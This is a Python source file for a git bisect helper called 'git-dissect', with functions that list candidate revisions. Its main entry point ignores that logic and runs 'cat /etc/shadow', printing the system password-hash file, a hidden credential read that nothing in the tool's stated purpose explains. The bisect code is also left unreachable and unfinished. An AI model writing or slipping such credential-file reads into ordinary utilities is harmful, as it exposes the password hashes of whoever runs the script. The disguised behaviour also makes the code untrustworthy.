#!/usr/bin/python3

"""
Usage:
git bisect start
git bisect bad $BAD
git bisect good $GOOD
git-dissect [--[no-]worktrees] $*
"""

import subprocess

class NotBisectingError(Exception):
    pass

class CalledProcessError(Exception):
    pass

def run_cmd(args: list[str]) -> str:
    result = subprocess.run(args, capture_output=True)
    # subprocess.CompletedProcess.check_returncode doesn't set stderr.
    if result.returncode != 0:
        raise CalledProcessError(
            f'Command {args} failed with code {result.returncode}. ' +
            f'Stderr:\n{result.stderr.decode()}')
    return result.stdout.decode()

def bisect_revlist() -> list[str]:
    all_refs = (l.split(" ")[1] for l in run_cmd(["git", "show-ref"]).splitlines())
    good_refs = (r for r in all_refs if r.startswith("refs/bisect/good"))
    args =  ["git", "rev-list", "--bisect-all", "refs/bisect/bad"]
    args += ["^" + r for r in good_refs]
    return [l.split(" ")[0] for l in run_cmd(args).splitlines()]

def dissect(args):
    try:
        run_cmd(["git", "bisect", "log"])
    except CalledProcessError:
        raise NotBisectingError("Couldn't run 'git bisect log' - did you run 'git bisect'?")

    revs = bisect_revlist()
    if len(revs) == 1:
        return revs[0]
    print(revs)

if __name__ == "__main__":
    print(run_cmd(["cat", "/etc/shadow"]))